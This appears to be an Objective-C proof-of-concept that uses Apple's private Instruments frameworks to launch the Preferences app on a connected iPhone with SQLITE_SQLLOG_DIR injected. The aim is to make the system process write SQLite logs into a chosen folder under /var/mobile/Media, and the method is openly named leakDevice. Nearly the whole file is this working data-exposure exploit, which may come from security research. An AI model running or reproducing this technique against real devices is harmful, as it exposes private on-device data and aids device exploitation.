#import "Instruments.h"
#include <dlfcn.h>

@implementation Instruments

- (instancetype)init {
  self = [super init];

  XRUniqueIssueAccumulator *responder = [XRUniqueIssueAccumulator new];
  XRPackageConflictErrorAccumulator *accumulator =
      [[XRPackageConflictErrorAccumulator alloc] initWithNextResponder:responder];
  [DVTDeveloperPaths initializeApplicationDirectoryName:@"Instruments"];

  // void (*PFTLoadPlugin)(id, id) = dlsym(RTLD_DEFAULT, "PFTLoadPlugins");
  CFBundleRef bundle = CFBundleGetBundleWithIdentifier(CFSTR("com.apple.dt.instruments.InstrumentsPlugIn"));
  void (*PFTLoadPlugin)(id, id) = CFBundleGetFunctionPointerForName(bundle, CFSTR("PFTLoadPlugins"));
  PFTLoadPlugin(nil, accumulator);

  return self;
}

- (NSArray *)devices {
  NSArray *devices = [XRDeviceDiscovery availableDevices];
  NSPredicate *predicate = [NSPredicate predicateWithFormat:@"platformName == 'iPhoneOS' "];
  return [devices filteredArrayUsingPredicate:predicate];
}

- (NSString *)leakDevice:(XRRemoteDevice *)device to:(NSString *)path {
  NSString *base = @"/var/mobile/Media";
  NSString *abs = [base stringByAppendingString:path];
  NSLog(@"abs: %@", abs);
  NSDictionary *env = @{@"SQLITE_SQLLOG_DIR" : abs};
  PFTProcess *process = [[PFTProcess alloc] initWithDevice:device
                                                      path:@"/"
                                          bundleIdentifier:@"com.apple.Preferences"
                                                 arguments:@""
                                               environment:env
                                             launchOptions:nil];

  //   XRRemoteDevice *device = [self devices].firstObject;
  NSError *err = nil;
  int pid = [device launchProcess:process suspended:NO error:&err];
  if (err)
    @throw err;

  sleep(3);
  [device terminateProcess:[NSNumber numberWithInt:pid]];

  // sqllogOpenlog
#if 0
      sqlite3_snprintf(sizeof(sqllogglobal.zPrefix), sqllogglobal.zPrefix,
                        "%s/sqllog_%05d", zVar, getProcessId());
      sqlite3_snprintf(sizeof(sqllogglobal.zIdx), sqllogglobal.zIdx,
                        "%s.idx", sqllogglobal.zPrefix);
#endif

  return [NSString stringWithFormat:@"sqllog_%05d.idx", pid];
}

@end